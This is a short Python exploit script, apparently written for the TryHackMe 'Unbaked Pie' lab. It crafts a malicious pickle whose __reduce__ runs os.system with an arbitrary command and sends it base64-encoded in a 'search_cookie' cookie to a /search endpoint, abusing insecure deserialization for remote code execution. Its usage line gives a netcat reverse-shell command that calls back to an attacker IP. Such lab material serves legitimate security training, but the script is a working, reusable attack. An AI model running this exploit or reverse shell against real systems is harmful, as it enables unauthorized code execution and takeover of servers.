#!/usr/bin/python
"""
usage: 
- for Unbaked Pie on TryHackMe
python3 pick.py http://$ip:5003 "nc -e /bin/sh attackIP 53"
"""
import pickle, base64, os, requests, sys

class RCE:
	def __reduce__(self):
		cmd = sys.argv[2]
		return os.system, (cmd,)

if __name__ == '__main__':
    pickled = pickle.dumps(RCE())
    cookie = base64.urlsafe_b64encode(pickled).decode('utf-8')

    url = sys.argv[1]
    r = requests.get(f"{url}/search", cookies={"search_cookie":cookie}) 
